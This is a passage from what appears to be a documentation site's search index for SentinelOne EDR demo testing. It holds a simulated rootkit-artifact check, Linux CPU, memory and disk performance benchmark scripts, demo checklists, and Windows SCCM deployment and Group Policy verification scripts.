skipping container escape tests\"\nfi\n</code></pre>"},{"location":"testing/linux/linux-overview/#rootkit-detection-testing","title":"Rootkit Detection Testing","text":"<pre><code>#!/bin/bash\necho \"=== ROOTKIT DETECTION TESTING ===\"\n\n# Create simulated rootkit artifacts for testing\necho \"Creating test rootkit artifacts...\"\n\n# Test hidden file detection\necho \"Testing hidden file detection...\"\nHIDDEN_FILE=\"/tmp/...hidden_malware\"\necho \"fake malware\" &gt; \"$HIDDEN_FILE\" 2&gt;/dev/null\n\nif [ -f \"$HIDDEN_FILE\" ]; then\n    echo \"Created test hidden file: $HIDDEN_FILE\"\n\n    # Wait for detection\n    sleep 5\n\n    # Check if file still exists (should be detected/removed)\n    if [ -f \"$HIDDEN_FILE\" ]; then\n        echo \"\u274c Hidden malware file not detected\"\n        rm -f \"$HIDDEN_FILE\"\n    else\n        echo \"\u2705 Hidden malware file detected and removed\"\n    fi\nfi\n\n# Test process hiding detection\necho \"Testing process hiding detection...\"\n\n# Create suspicious process name\nFAKE_PROCESS=\"[kernel_worker]\"\n(sleep 300 &amp; echo $! &gt; /tmp/fake_kernel_pid) &amp;\n\nsleep 2\n\n# Check if suspicious process is detected\nif ps aux | grep -v grep | grep -q \"sleep 300\"; then\n    echo \"Test process visible in process list\"\n\n    # Kill the test process\n    if [ -f \"/tmp/fake_kernel_pid\" ]; then\n        kill $(cat /tmp/fake_kernel_pid) 2&gt;/dev/null\n        rm -f /tmp/fake_kernel_pid\n    fi\nfi\n\n# Test kernel module integrity\necho \"Testing kernel module integrity...\"\necho \"Current kernel modules:\"\nlsmod | head -5\n\n# Test network hiding\necho \"Testing network connection monitoring...\"\nnetstat -tlnp | head -10\n\necho \"Rootkit detection tests completed\"\n</code></pre>"},{"location":"testing/linux/linux-overview/#linux-performance-monitoring","title":"\ud83d\udcca Linux Performance Monitoring","text":""},{"location":"testing/linux/linux-overview/#system-resource-monitoring","title":"System Resource Monitoring","text":"<pre><code>#!/bin/bash\necho \"=== LINUX SYSTEM RESOURCE MONITORING ===\"\n\n# CPU monitoring\necho \"=== CPU Information ===\"\ncat /proc/cpuinfo | grep \"model name\" | head -1\ncat /proc/loadavg\necho \"CPU usage by SentinelOne processes:\"\nps aux | grep sentinelone | grep -v grep | awk '{print $3, $11}' | sort -nr\n\n# Memory monitoring\necho -e \"\\n=== Memory Information ===\"\nfree -h\necho \"Memory usage by SentinelOne processes:\"\nps aux | grep sentinelone | grep -v grep | awk '{print $4, $6, $11}' | sort -nr\n\n# Disk monitoring\necho -e \"\\n=== Disk Information ===\"\ndf -h | head -5\necho \"SentinelOne disk usage:\"\ndu -sh /opt/sentinelone 2&gt;/dev/null || echo \"SentinelOne directory not found\"\ndu -sh /var/lib/sentinelone 2&gt;/dev/null || echo \"SentinelOne data directory not found\"\ndu -sh /var/log/sentinelone 2&gt;/dev/null || echo \"SentinelOne log directory not found\"\n\n# Network monitoring\necho -e \"\\n=== Network Information ===\"\nss -tlnp | grep sentinelone || echo \"No SentinelOne network connections\"\n\n# Process monitoring\necho -e \"\\n=== Process Information ===\"\necho \"SentinelOne processes:\"\npgrep -a sentinelone | head -10\n\n# System calls monitoring (if strace available)\nif command -v strace &amp;&gt; /dev/null; then\n    echo -e \"\\n=== System Call Monitoring ===\"\n    SENTINEL_PID=$(pgrep sentinelone-agent | head -1)\n    if [ -n \"$SENTINEL_PID\" ]; then\n        echo \"Monitoring system calls for PID $SENTINEL_PID (5 seconds)...\"\n        timeout 5 strace -p \"$SENTINEL_PID\" -c 2&gt;&amp;1 | tail -10\n    fi\nfi\n</code></pre>"},{"location":"testing/linux/linux-overview/#linux-testing-checklist","title":"\ud83d\udcdd Linux Testing Checklist","text":""},{"location":"testing/linux/linux-overview/#pre-demo-preparation","title":"Pre-Demo Preparation","text":"<ul> <li>[ ] Linux Server Environment Ready</li> <li>[ ] Distribution and version verified</li> <li>[ ] SELinux/AppArmor status checked</li> <li>[ ] Required services (Apache/Nginx/DB) installed</li> <li>[ ] Network connectivity verified</li> <li> <p>[ ] Container runtime available (if needed)</p> </li> <li> <p>[ ] SentinelOne Agent Deployed</p> </li> <li>[ ] Agent installed with correct Linux package</li> <li>[ ] Service status verified (systemctl status)</li> <li>[ ] Connected to management console</li> <li>[ ] Policy applied and active</li> <li> <p>[ ] Kernel modules loaded (if applicable)</p> </li> <li> <p>[ ] Testing Tools Prepared</p> </li> <li>[ ] Basic development tools (gcc, make) available</li> <li>[ ] Debug tools (strace, gdb) available</li> <li>[ ] Container tools (docker/podman) configured</li> <li>[ ] Log monitoring tools ready</li> </ul>"},{"location":"testing/linux/linux-overview/#demo-execution-checklist","title":"Demo Execution Checklist","text":"<ul> <li>[ ] Real-time Protection Demo</li> <li>[ ] EICAR file detection test</li> <li>[ ] Malicious script blocking</li> <li>[ ] Container escape prevention</li> <li> <p>[ ] Rootkit artifact detection</p> </li> <li> <p>[ ] System Integration Demo</p> </li> <li>[ ] SELinux/AppArmor compatibility</li> <li>[ ] Systemd service protection</li> <li>[ ] Kernel module protection</li> <li> <p>[ ] System call monitoring</p> </li> <li> <p>[ ] Application Protection Demo</p> </li> <li>[ ] Web server protection (Apache/Nginx)</li> <li>[ ] Database server protection</li> <li>[ ] Container runtime protection</li> <li>[ ] Service tampering prevention</li> </ul>"},{"location":"testing/linux/linux-overview/#success-metrics","title":"Success Metrics","text":"<ul> <li>[ ] Protection Effectiveness: &gt;99% threat detection rate</li> <li>[ ] System Integration: No conflicts with Linux security modules</li> <li>[ ] Performance Impact: &lt;5% CPU, &lt;300MB RAM usage</li> <li>[ ] Service Protection: 100% critical service protection</li> <li>[ ] Container Security: Complete container runtime protection</li> </ul>"},{"location":"testing/linux/linux-overview/#next-steps","title":"Next Steps","text":"<p>Continue with specific Linux testing scenarios: - Linux Offline Testing - Linux Container Security - Linux Performance Testing</p> <p>Linux Server Ready</p> <p>Comprehensive Linux Server testing framework prepared for executive demonstration. All critical Linux-specific scenarios covered with detailed validation procedures including SELinux/AppArmor integration, container security, and kernel-level protection.</p>"},{"location":"testing/linux/linux-performance/","title":"Linux Performance Testing Scenarios","text":""},{"location":"testing/linux/linux-performance/#overview","title":"Overview","text":"<p>Pengujian komprehensif dampak performa SentinelOne EDR terhadap sistem Linux server dalam berbagai skenario beban kerja.</p>"},{"location":"testing/linux/linux-performance/#performance-testing-architecture","title":"\ud83c\udfaf Performance Testing Architecture","text":"<pre><code>flowchart TB\n    subgraph \"Performance Monitoring Stack\"\n        BASELINE[\"Baseline Performance&lt;br/&gt;Pre-SentinelOne\"]\n        MONITORING[\"Performance Monitoring&lt;br/&gt;htop, iostat, sar\"]\n        BENCHMARKS[\"Benchmark Tools&lt;br/&gt;sysbench, stress-ng\"]\n    end\n\n    subgraph \"Linux System Under Test\"\n        CPU[\"CPU Performance&lt;br/&gt;Multi-core Testing\"]\n        MEMORY[\"Memory Usage&lt;br/&gt;RAM &amp; Swap\"]\n        DISK[\"Disk I/O&lt;br/&gt;Read/Write Operations\"]\n        NETWORK[\"Network Throughput&lt;br/&gt;TCP/UDP Performance\"]\n    end\n\n    subgraph \"SentinelOne Agent\"\n        AGENT_CPU[\"Agent CPU Usage&lt;br/&gt;Real-time Scanning\"]\n        AGENT_MEM[\"Agent Memory&lt;br/&gt;Footprint Analysis\"]\n        AGENT_IO[\"Agent Disk I/O&lt;br/&gt;Log &amp; Cache Files\"]\n        AGENT_NET[\"Agent Network&lt;br/&gt;Telemetry Upload\"]\n    end\n\n    BASELINE --&gt; CPU\n    BASELINE --&gt; MEMORY\n    BASELINE --&gt; DISK\n    BASELINE --&gt; NETWORK\n\n    MONITORING --&gt; CPU\n    MONITORING --&gt; MEMORY\n    MONITORING --&gt; DISK\n    MONITORING --&gt; NETWORK\n\n    CPU -.-&gt; AGENT_CPU\n    MEMORY -.-&gt; AGENT_MEM\n    DISK -.-&gt; AGENT_IO\n    NETWORK -.-&gt; AGENT_NET\n\n    style BASELINE fill:#e3f2fd\n    style AGENT_CPU fill:#fff3e0\n    style AGENT_MEM fill:#e8f5e8\n    style AGENT_IO fill:#fce4ec\n    style AGENT_NET fill:#f3e5f5</code></pre>"},{"location":"testing/linux/linux-performance/#e1-cpu-performance-testing","title":"\ud83d\udcca E1: CPU Performance Testing","text":""},{"location":"testing/linux/linux-performance/#e11-baseline-cpu-performance-measurement","title":"E1.1: Baseline CPU Performance Measurement","text":"<pre><code>#!/bin/bash\n# CPU Performance Baseline Test\n\necho \"=== CPU Performance Baseline Test ===\"\n\n# System information\necho \"System Information:\"\nlscpu | grep -E \"Architecture|CPU|Thread|Socket|Core\"\ncat /proc/cpuinfo | grep \"model name\" | head -1\n\n# Install benchmark tools if needed\ninstall_tools() {\n    if ! command -v sysbench &amp;&gt; /dev/null; then\n        echo \"Installing sysbench...\"\n        sudo apt-get update &amp;&amp; sudo apt-get install -y sysbench || \\\n        sudo yum install -y sysbench || \\\n        sudo dnf install -y sysbench\n    fi\n\n    if ! command -v stress-ng &amp;&gt; /dev/null; then\n        echo \"Installing stress-ng...\"\n        sudo apt-get install -y stress-ng || \\\n        sudo yum install -y stress-ng || \\\n        sudo dnf install -y stress-ng\n    fi\n}\n\ninstall_tools\n\n# CPU benchmark without SentinelOne (if not installed)\necho \"=== CPU Benchmark Results ===\"\nsysbench cpu --cpu-max-prime=20000 --threads=$(nproc) run\n\n# Multi-threading stress test\necho \"=== Multi-threading Stress Test (60 seconds) ===\"\ntimeout 60s stress-ng --cpu $(nproc) --metrics-brief\n\n# Context switching performance\necho \"=== Context Switching Performance ===\"\nsysbench threads --thread-locks=1 --max-time=30 run\n</code></pre>"},{"location":"testing/linux/linux-performance/#e12-cpu-performance-with-sentinelone-agent","title":"E1.2: CPU Performance with SentinelOne Agent","text":"<pre><code>#!/bin/bash\n# CPU Performance with SentinelOne Agent\n\necho \"=== CPU Performance with SentinelOne Agent ===\"\n\n# Check SentinelOne agent status\necho \"SentinelOne Agent Status:\"\nsudo /opt/sentinelone/bin/sentinelctl status\n\n# Monitor SentinelOne CPU usage during stress test\nmonitor_sentinelone_cpu() {\n    echo \"Monitoring SentinelOne CPU usage...\"\n    while true; do\n        SENTINEL_CPU=$(ps aux | grep sentinelone | grep -v grep | awk '{sum+=$3} END {print sum+0}')\n        TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')\n        echo \"$TIMESTAMP - SentinelOne CPU: ${SENTINEL_CPU}%\"\n        sleep 5\n    done\n}\n\n# Start monitoring in background\nmonitor_sentinelone_cpu &amp;\nMONITOR_PID=$!\n\n# Run CPU benchmark with agent active\necho \"=== CPU Benchmark with SentinelOne Active ===\"\nsysbench cpu --cpu-max-prime=20000 --threads=$(nproc) run\n\necho \"=== Stress Test with SentinelOne Active ===\"\ntimeout 60s stress-ng --cpu $(nproc) --metrics-brief\n\n# Stop monitoring\nkill $MONITOR_PID 2&gt;/dev/null\n\n# Compare results\necho \"=== Performance Impact Analysis ===\"\necho \"Check the CPU usage difference between baseline and with-agent results\"\n</code></pre>"},{"location":"testing/linux/linux-performance/#e13-real-time-cpu-impact-during-file-operations","title":"E1.3: Real-time CPU Impact During File Operations","text":"<pre><code>#!/bin/bash\n# Real-time CPU monitoring during file operations\n\necho \"=== CPU Impact During File Operations ===\"\n\n# Function to create large files for scanning\ncreate_test_files() {\n    mkdir -p /tmp/performance_test\n    echo \"Creating test files for real-time scanning...\"\n\n    # Create various file types\n    dd if=/dev/urandom of=/tmp/performance_test/binary_file.bin bs=1M count=100\n    dd if=/dev/zero of=/tmp/performance_test/zero_file.dat bs=1M count=100\n\n    # Create text files\n    for i in {1..50}; do\n        cat /var/log/syslog &gt; \"/tmp/performance_test/text_file_$i.txt\" 2&gt;/dev/null || \\\n        dmesg &gt; \"/tmp/performance_test/text_file_$i.txt\"\n    done\n\n    # Create executable files\n    cp /bin/bash /tmp/performance_test/test_executable\n    chmod +x /tmp/performance_test/test_executable\n}\n\n# Monitor CPU during file creation\necho \"Starting CPU monitoring during file operations...\"\nsar -u 1 60 &gt; /tmp/cpu_during_fileops.log &amp;\nSAR_PID=$!\n\n# Create files (will trigger real-time scanning)\ncreate_test_files\n\n# Stop SAR monitoring\nkill $SAR_PID 2&gt;/dev/null\n\n# Analyze results\necho \"CPU usage during file operations:\"\ntail -20 /tmp/cpu_during_fileops.log\n\n# Cleanup\nrm -rf /tmp/performance_test\nrm -f /tmp/cpu_during_fileops.log\n</code></pre>"},{"location":"testing/linux/linux-performance/#e2-memory-performance-testing","title":"\ud83e\udde0 E2: Memory Performance Testing","text":""},{"location":"testing/linux/linux-performance/#e21-memory-footprint-analysis","title":"E2.1: Memory Footprint Analysis","text":"<pre><code>#!/bin/bash\n# Memory footprint analysis\n\necho \"=== Memory Footprint Analysis ===\"\n\n# System memory information\necho \"System Memory Information:\"\nfree -h\ncat /proc/meminfo | grep -E \"MemTotal|MemFree|MemAvailable\"\n\n# SentinelOne agent memory usage\necho \"=== SentinelOne Agent Memory Usage ===\"\nps aux | grep sentinelone | grep -v grep | awk '{print $11, \"RSS:\", $6\"KB\", \"VSZ:\", $5\"KB\"}'\n\n# Detailed memory analysis\necho \"=== Detailed Memory Analysis ===\"\nsudo pmap $(pgrep sentinelone | head -1) | tail -1\n\n# Memory usage over time\necho \"=== Memory Usage Monitoring (5 minutes) ===\"\nfor i in {1..60}; do\n    TIMESTAMP=$(date '+%H:%M:%S')\n    SENTINEL_MEM=$(ps aux | grep sentinelone | grep -v grep | awk '{sum+=$6} END {print sum+0}')\n    TOTAL_MEM=$(free | grep Mem | awk '{print $3}')\n    PERCENTAGE=$(echo \"scale=2; $SENTINEL_MEM * 100 / $TOTAL_MEM\" | bc -l 2&gt;/dev/null || echo \"N/A\")\n    echo \"$TIMESTAMP - SentinelOne Memory: ${SENTINEL_MEM}KB (${PERCENTAGE}% of used memory)\"\n    sleep 5\ndone\n</code></pre>"},{"location":"testing/linux/linux-performance/#e22-memory-stress-testing-with-agent","title":"E2.2: Memory Stress Testing with Agent","text":"<pre><code>#!/bin/bash\n# Memory stress testing with SentinelOne agent\n\necho \"=== Memory Stress Testing ===\"\n\n# Baseline memory usage\necho \"Baseline memory usage:\"\nfree -h\n\n# Memory stress test function\nmemory_stress_test() {\n    local test_name=$1\n    local duration=$2\n\n    echo \"=== $test_name ===\"\n\n    # Start memory monitoring\n    vmstat 1 $duration &gt; \"/tmp/memtest_${test_name}.log\" &amp;\n    VMSTAT_PID=$!\n\n    # Run memory stress test\n    timeout ${duration}s stress-ng --vm 2 --vm-bytes 75% --metrics-brief\n\n    # Stop monitoring\n    kill $VMSTAT_PID 2&gt;/dev/null\n\n    # Show results\n    echo \"Memory test results for $test_name:\"\n    tail -10 \"/tmp/memtest_${test_name}.log\"\n\n    # Check SentinelOne agent stability\n    echo \"SentinelOne agent status after $test_name:\"\n    sudo /opt/sentinelone/bin/sentinelctl status | grep -E \"Agent|Status\"\n\n    rm -f \"/tmp/memtest_${test_name}.log\"\n}\n\n# Run different memory stress scenarios\nmemory_stress_test \"moderate_load\" 60\nsleep 10\nmemory_stress_test \"heavy_load\" 120\n\necho \"=== Memory Impact Summary ===\"\necho \"Check if SentinelOne agent maintained stability during memory pressure\"\n</code></pre>"},{"location":"testing/linux/linux-performance/#e23-memory-leak-detection","title":"E2.3: Memory Leak Detection","text":"<pre><code>#!/bin/bash\n# Memory leak detection for SentinelOne agent\n\necho \"=== Memory Leak Detection ===\"\n\n# Function to monitor memory growth\nmonitor_memory_growth() {\n    local duration_hours=$1\n    local duration_seconds=$((duration_hours * 3600))\n    local interval=300  # 5 minutes\n    local iterations=$((duration_seconds / interval))\n\n    echo \"Monitoring memory growth for $duration_hours hours...\"\n\n    for i in $(seq 1 $iterations); do\n        TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')\n\n        # Get SentinelOne process memory\n        SENTINEL_PROCESSES=$(ps aux | grep sentinelone | grep -v grep)\n\n        if [ -n \"$SENTINEL_PROCESSES\" ]; then\n            TOTAL_RSS=$(echo \"$SENTINEL_PROCESSES\" | awk '{sum+=$6} END {print sum+0}')\n            TOTAL_VSZ=$(echo \"$SENTINEL_PROCESSES\" | awk '{sum+=$5} END {print sum+0}')\n\n            echo \"$TIMESTAMP - RSS: ${TOTAL_RSS}KB, VSZ: ${TOTAL_VSZ}KB\"\n            echo \"$TIMESTAMP,$TOTAL_RSS,$TOTAL_VSZ\" &gt;&gt; /tmp/sentinelone_memory_growth.csv\n        else\n            echo \"$TIMESTAMP - No SentinelOne processes found\"\n        fi\n\n        sleep $interval\n    done\n}\n\n# Create CSV header\necho \"timestamp,rss_kb,vsz_kb\" &gt; /tmp/sentinelone_memory_growth.csv\n\n# Monitor for 2 hours (adjust as needed)\nmonitor_memory_growth 2\n\n# Analyze growth\necho \"=== Memory Growth Analysis ===\"\nif [ -f /tmp/sentinelone_memory_growth.csv ]; then\n    echo \"Memory usage over time (last 10 entries):\"\n    tail -10 /tmp/sentinelone_memory_growth.csv\n\n    # Simple growth calculation\n    FIRST_RSS=$(head -2 /tmp/sentinelone_memory_growth.csv | tail -1 | cut -d',' -f2)\n    LAST_RSS=$(tail -1 /tmp/sentinelone_memory_growth.csv | cut -d',' -f2)\n\n    if [ -n \"$FIRST_RSS\" ] &amp;&amp; [ -n \"$LAST_RSS\" ]; then\n        GROWTH=$((LAST_RSS - FIRST_RSS))\n        echo \"Memory growth over monitoring period: ${GROWTH}KB\"\n\n        if [ $GROWTH -gt 10000 ]; then  # 10MB growth threshold\n            echo \"\u26a0\ufe0f  WARNING: Significant memory growth detected\"\n        else\n            echo \"\u2705 Memory usage appears stable\"\n        fi\n    fi\nfi\n\n# Cleanup\nrm -f /tmp/sentinelone_memory_growth.csv\n</code></pre>"},{"location":"testing/linux/linux-performance/#e3-disk-io-performance-testing","title":"\ud83d\udcbe E3: Disk I/O Performance Testing","text":""},{"location":"testing/linux/linux-performance/#e31-disk-io-baseline-and-impact","title":"E3.1: Disk I/O Baseline and Impact","text":"<pre><code>#!/bin/bash\n# Disk I/O performance testing\n\necho \"=== Disk I/O Performance Testing ===\"\n\n# System disk information\necho \"Disk Information:\"\ndf -h\nlsblk\n\n# Install fio if needed\ninstall_fio() {\n    if ! command -v fio &amp;&gt; /dev/null; then\n        echo \"Installing fio...\"\n        sudo apt-get update &amp;&amp; sudo apt-get install -y fio || \\\n        sudo yum install -y fio || \\\n        sudo dnf install -y fio\n    fi\n}\n\ninstall_fio\n\n# Function to run disk I/O tests\nrun_disk_test() {\n    local test_name=$1\n    local test_type=$2\n\n    echo \"=== $test_name ===\"\n\n    # Start I/O monitoring\n    iostat -x 1 60 &gt; \"/tmp/iostat_${test_name}.log\" &amp;\n    IOSTAT_PID=$!\n\n    # Monitor SentinelOne I/O impact\n    sudo iotop -a -o -d 1 -n 60 | grep sentinelone &gt; \"/tmp/sentinelone_io_${test_name}.log\" &amp;\n    IOTOP_PID=$!\n\n    # Run fio test based on type\n    case $test_type in\n        \"sequential_read\")\n            fio --name=seqread --rw=read --bs=1M --size=1G --numjobs=1 --runtime=60 --group_reporting\n            ;;\n        \"sequential_write\")\n            fio --name=seqwrite --rw=write --bs=1M --size=1G --numjobs=1 --runtime=60 --group_reporting\n            ;;\n        \"random_read\")\n            fio --name=randread --rw=randread --bs=4k --size=1G --numjobs=4 --runtime=60 --group_reporting\n            ;;\n        \"random_write\")\n            fio --name=randwrite --rw=randwrite --bs=4k --size=1G --numjobs=4 --runtime=60 --group_reporting\n            ;;\n        \"mixed\")\n            fio --name=mixed --rw=randrw --bs=4k --size=1G --numjobs=4 --runtime=60 --rwmixread=70 --group_reporting\n            ;;\n    esac\n\n    # Stop monitoring\n    kill $IOSTAT_PID $IOTOP_PID 2&gt;/dev/null\n\n    # Show results\n    echo \"I/O statistics for $test_name:\"\n    tail -10 \"/tmp/iostat_${test_name}.log\"\n\n    echo \"SentinelOne I/O impact during $test_name:\"\n    cat \"/tmp/sentinelone_io_${test_name}.log\" | head -10\n\n    # Cleanup\n    rm -f \"/tmp/iostat_${test_name}.log\" \"/tmp/sentinelone_io_${test_name}.log\"\n    rm -f seqread.* seqwrite.* randread.* randwrite.* mixed.*\n}\n\n# Run various I/O tests\nrun_disk_test \"Sequential_Read\" \"sequential_read\"\nsleep 10\nrun_disk_test \"Sequential_Write\" \"sequential_write\"\nsleep 10\nrun_disk_test \"Random_Read\" \"random_read\"\nsleep 10\nrun_disk_test \"Random_Write\" \"random_write\"\nsleep 10\nrun_disk_test \"Mixed_Workload\" \"mixed\"\n</code></pre>"},{"location":"testing/linux/linux-performance/#e32-real-time-scanning-io-impact","title":"E3.2: Real-time Scanning I/O Impact","text":"<pre><code>#!/bin/bash\n# Real-time scanning I/O impact test\n\necho \"=== Real-time Scanning I/O Impact ===\"\n\n# Create directory for test files\nmkdir -p /tmp/realtime_scan_test\n\n# Monitor I/O during file creation and modification\necho \"Starting I/O monitoring for real-time scanning...\"\niostat -x 1 120 &gt; /tmp/realtime_io.log &amp;\nIOSTAT_PID=$!\n\n# Create various file types to trigger scanning\necho \"Creating files to trigger real-time scanning...\"\n\n# Binary files\nfor i in {1..10}; do\n    dd if=/dev/urandom of=\"/tmp/realtime_scan_test/binary_$i.bin\" bs=1M count=10 2&gt;/dev/null\n    sleep 2\ndone\n\n# Executable files\nfor i in {1..5}; do\n    cp /bin/ls \"/tmp/realtime_scan_test/executable_$i\"\n    chmod +x \"/tmp/realtime_scan_test/executable_$i\"\n    sleep 1\ndone\n\n# Archive files\nfor i in {1..3}; do\n    tar -czf \"/tmp/realtime_scan_test/archive_$i.tar.gz\" /var/log/syslog 2&gt;/dev/null\n    sleep 2\ndone\n\n# Large text files\nfor i in {1..5}; do\n    cat /var/log/* &gt; \"/tmp/realtime_scan_test/large_text_$i.txt\" 2&gt;/dev/null\n    sleep 1\ndone\n\n# Stop monitoring\nkill $IOSTAT_PID 2&gt;/dev/null\n\n# Analyze results\necho \"=== I/O Impact Analysis ===\"\necho \"Average I/O statistics during real-time scanning:\"\nawk 'NR&gt;3 {avg_read+=$4; avg_write+=$5; count++} END {print \"Avg Read:\", avg_read/count, \"KB/s, Avg Write:\", avg_write/count, \"KB/s\"}' /tmp/realtime_io.log\n\n# Check SentinelOne scanning activity\necho \"SentinelOne scanning activity:\"\nsudo /opt/sentinelone/bin/sentinelctl logs --tail 20 | grep -i \"scan\\|file\"\n\n# Cleanup\nrm -rf /tmp/realtime_scan_test\nrm -f /tmp/realtime_io.log\n</code></pre>"},{"location":"testing/linux/linux-performance/#performance-impact-summary","title":"\ud83d\udcca Performance Impact Summary","text":""},{"location":"testing/linux/linux-performance/#expected-performance-targets","title":"Expected Performance Targets","text":"Metric Target Impact Acceptable Range CPU Usage &lt; 5% average &lt; 10% peak Memory Usage &lt; 300MB RSS &lt; 500MB RSS Disk I/O Overhead &lt; 15% &lt; 25% Network Bandwidth &lt; 1MB/s &lt; 2MB/s"},{"location":"testing/linux/linux-performance/#validation-checklist","title":"Validation Checklist","text":""},{"location":"testing/linux/linux-performance/#cpu-performance","title":"CPU Performance","text":"<ul> <li>[ ] Baseline CPU: Benchmark results recorded without agent</li> <li>[ ] Agent CPU Impact: CPU overhead &lt; 5% during normal operations</li> <li>[ ] Stress Test Stability: Agent remains stable under CPU stress</li> <li>[ ] Real-time Scanning: File scanning CPU impact &lt; 10%</li> </ul>"},{"location":"testing/linux/linux-performance/#memory-performance","title":"Memory Performance","text":"<ul> <li>[ ] Memory Footprint: Agent RSS memory &lt; 300MB</li> <li>[ ] Memory Stability: No memory leaks over 24 hours</li> <li>[ ] Stress Test Resilience: Agent survives memory pressure tests</li> <li>[ ] Growth Rate: Memory growth &lt; 1MB/hour</li> </ul>"},{"location":"testing/linux/linux-performance/#disk-io-performance","title":"Disk I/O Performance","text":"<ul> <li>[ ] I/O Overhead: Disk I/O impact &lt; 15%</li> <li>[ ] Real-time Scanning: File scanning I/O overhead acceptable</li> <li>[ ] Batch Operations: Large file operations don't overwhelm system</li> <li>[ ] Log Management: Agent logs don't consume excessive disk space</li> </ul>"},{"location":"testing/linux/linux-performance/#next-steps","title":"Next Steps","text":"<p>Continue with: - Linux Offline Testing - Linux Container Testing - Cross-Platform Performance Comparison</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"testing/windows/windows-enterprise/","title":"Windows Enterprise Testing Scenarios","text":""},{"location":"testing/windows/windows-enterprise/#overview","title":"Overview","text":"<p>Pengujian komprehensif SentinelOne EDR dalam environment enterprise Windows, termasuk integrasi dengan Active Directory, Group Policy, dan aplikasi enterprise.</p>"},{"location":"testing/windows/windows-enterprise/#enterprise-integration-architecture","title":"\ud83c\udfe2 Enterprise Integration Architecture","text":"<pre><code>flowchart TB\n    subgraph \"Enterprise Infrastructure\"\n        AD[\"Active Directory&lt;br/&gt;Domain Controller\"]\n        GPO[\"Group Policy Objects&lt;br/&gt;Configuration Management\"]\n        SCCM[\"SCCM/MECM&lt;br/&gt;Software Deployment\"]\n        EXCHANGE[\"Exchange Server&lt;br/&gt;Email Security\"]\n        SHAREPOINT[\"SharePoint Server&lt;br/&gt;Collaboration Platform\"]\n    end\n\n    subgraph \"SentinelOne Integration\"\n        AGENT[\"SentinelOne Agent\"]\n        CONSOLE[\"SentinelOne Console\"]\n        API[\"SentinelOne API&lt;br/&gt;Automation\"]\n    end\n\n    subgraph \"Testing Focus\"\n        DEPLOY[\"Agent Deployment &amp; GPO\"]\n        AD_INT[\"Active Directory Integration\"]\n        EXCLUSIONS[\"Application Exclusions\"]\n        VDI[\"VDI Environment Testing\"]\n        COMPATIBILITY[\"Third-party Compatibility\"]\n    end\n\n    AD -- \"User &amp; Device Info\" --&gt; AGENT\n    GPO -- \"Policy Enforcement\" --&gt; AGENT\n    SCCM -- \"Agent Deployment\" --&gt; AGENT\n\n    AGENT -- \"Telemetry &amp; Alerts\" --&gt; CONSOLE\n    CONSOLE -- \"API Integration\" --&gt; API\n    API -- \"Automation\" --&gt; AD\n\n    DEPLOY -- \"Tests\" --&gt; GPO\n    AD_INT -- \"Tests\" --&gt; AD\n    EXCLUSIONS -- \"Tests\" --&gt; EXCHANGE\n    EXCLUSIONS -- \"Tests\" --&gt; SHAREPOINT\n    VDI -- \"Tests\" --&gt; AGENT\n    COMPATIBILITY -- \"Tests\" --&gt; AGENT\n\n    style AD fill:#e3f2fd\n    style AGENT fill:#f3e5f5\n    style DEPLOY fill:#e8f5e8</code></pre>"},{"location":"testing/windows/windows-enterprise/#f1-agent-deployment-and-gpo-testing","title":"\ud83d\udce6 F1: Agent Deployment and GPO Testing","text":""},{"location":"testing/windows/windows-enterprise/#f11-automated-deployment-via-sccmmecm","title":"F1.1: Automated Deployment via SCCM/MECM","text":"<pre><code># SCCM/MECM Deployment Script (Conceptual)\n# This script would be packaged as an application in SCCM\n\nparam (\n    [string]$SiteToken,\n    [string]$InstallerPath\n)\n\nWrite-Host \"Starting SentinelOne EDR deployment via SCCM...\"\n\n# Check if agent is already installed\n$agentInstalled = Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like \"*SentinelOne*\"}\nif ($agentInstalled) {\n    Write-Host \"SentinelOne agent already installed. Exiting.\"\n    exit 0\n}\n\n# Check for installer\nif (-not (Test-Path $InstallerPath)) {\n    Write-Host \"Installer not found at $InstallerPath. Exiting.\"\n    exit 1\n}\n\n# Silent installation command\n$arguments = @(\n    \"/i\",\n    \"`\"$InstallerPath`\"\",\n    \"/quiet\",\n    \"SITE_TOKEN=$SiteToken\",\n    \"REBOOT=ReallySuppress\"\n)\n\nWrite-Host \"Executing MSI installer...\"\nStart-Process msiexec.exe -ArgumentList $arguments -Wait -NoNewWindow\n\n# Verification\nif ($?) {\n    Write-Host \"Installation command executed successfully. Verifying status...\"\n    Start-Sleep -Seconds 30\n\n    $sentinelCtl = \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\"\n    if (Test-Path $sentinelCtl) {\n        $status = &amp; $sentinelCtl status\n        if ($status -match \"running\") {\n            Write-Host \"\u2705 SentinelOne agent installed and running successfully.\"\n            exit 0\n        } else {\n            Write-Host \"\u26a0\ufe0f  Installation complete, but agent not running. Check logs.\"\n            exit 1\n        }\n    } else {\n        Write-Host \"\u26a0\ufe0f  Installation complete, but sentinelctl not found.\"\n        exit 1\n    }\n} else {\n    Write-Host \"\u274c MSI installation failed.\"\n    exit 1\n}\n</code></pre>"},{"location":"testing/windows/windows-enterprise/#f12-group-policy-gpo-configuration-testing","title":"F1.2: Group Policy (GPO) Configuration Testing","text":"<pre><code># PowerShell script to verify GPO settings for SentinelOne\nWrite-Host \"=== GPO Configuration Validation for SentinelOne ===\" -ForegroundColor Green\n\n# 1. Verify SentinelOne Service Settings\nWrite-Host \"Verifying service settings...\" -ForegroundColor Yellow\n$sentinelServices = Get-Service | Where-Object {$_.Name -like \"*Sentinel*\"}\nforeach ($service in $sentinelServices) {\n    if ($service.StartType -ne \"Automatic\") {\n        Write-Host \"\u26a0\ufe0f  Service $($service.Name) is not set to Automatic start.\" -ForegroundColor Red\n    } else {\n        Write-Host \"\u2705 Service $($service.Name) is configured for Automatic start.\"\n    }\n}\n\n# 2. Verify Windows Firewall Rules for SentinelOne\nWrite-Host \"Verifying Windows Firewall rules...\" -ForegroundColor Yellow\n$firewallRule = Get-NetFirewallRule | Where-Object {$_.DisplayName -like \"*SentinelOne*\" -and $_.Direction -eq \"Outbound\" -and $_.Action -eq \"Allow\"}\nif ($firewallRule) {\n    Write-Host \"\u2705 Outbound firewall rule for SentinelOne communication found.\"\n} else {\n    Write-Host \"\u26a0\ufe0f  No outbound firewall rule for SentinelOne found.\" -ForegroundColor Yellow\n}\n\n# 3. Verify Application Whitelisting (AppLocker/WDAC)\nWrite-Host \"Verifying 